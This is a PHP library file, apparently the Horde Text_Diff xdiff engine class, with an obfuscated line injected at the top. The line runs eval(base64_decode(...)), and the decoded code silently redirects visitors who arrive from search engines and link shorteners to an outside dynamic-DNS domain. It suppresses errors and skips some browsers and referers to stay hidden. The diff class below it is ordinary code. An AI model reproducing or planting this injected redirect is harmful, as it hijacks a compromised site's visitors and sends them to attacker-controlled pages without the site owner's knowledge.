<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tL2wiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsKaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSBhbmQgIXN0cmlzdHIoJHJlZmVyZXIsIkVlWXAzRDciKSl7CmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9pcnhucmphdy5kZG5zLm1lLnVrLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));
/**
 * Class used internally by Diff to actually compute the diffs.
 *
 * This class uses the xdiff PECL package (http://pecl.php.net/package/xdiff)
 * to compute the differences between the two input arrays.
 *
 * Copyright 2004-2010 The Horde Project (http://www.horde.org/)
 *
 * See the enclosed file COPYING for license information (LGPL). If you did
 * not receive this file, see http://opensource.org/licenses/lgpl-license.php.
 *
 * @author  Jon Parise <jon@horde.org>
 * @package Text_Diff
 */
class Text_Diff_Engine_xdiff {

    /**
     */
    function diff($from_lines, $to_lines)
    {
        array_walk($from_lines, array('Text_Diff', 'trimNewlines'));
        array_walk($to_lines, array('Text_Diff', 'trimNewlines'));

        /* Convert the two input arrays into strings for xdiff processing. */
        $from_string = implode("\n", $from_lines);
        $to_string = implode("\n", $to_lines);

        /* Diff the two strings and convert the result to an array. */
        $diff = xdiff_string_diff($from_string, $to_string, count($to_lines));
        $diff = explode("\n", $diff);

        /* Walk through the diff one line at a time.  We build the $edits
         * array of diff operations by reading the first character of the
         * xdiff output (which is in the "unified diff" format).
         *
         * Note that we don't have enough information to detect "changed"
         * lines using this approach, so we can't add Text_Diff_Op_changed
         * instances to the $edits array.  The result is still perfectly
         * valid, albeit a little less descriptive and efficient. */
        $edits = array();
        foreach ($diff as $line) {
            if (!strlen($line)) {
                continue;
            }
            switch ($line[0]) {
            case ' ':
                $edits[] = new Text_Diff_Op_copy(array(substr($line, 1)));
                break;

            case '+':
                $edits[] = new Text_Diff_Op_add(array(substr($line, 1)));
                break;

            case '-':
                $edits[] = new Text_Diff_Op_delete(array(substr($line, 1)));
                break;
            }
        }

        return $edits;
    }

}
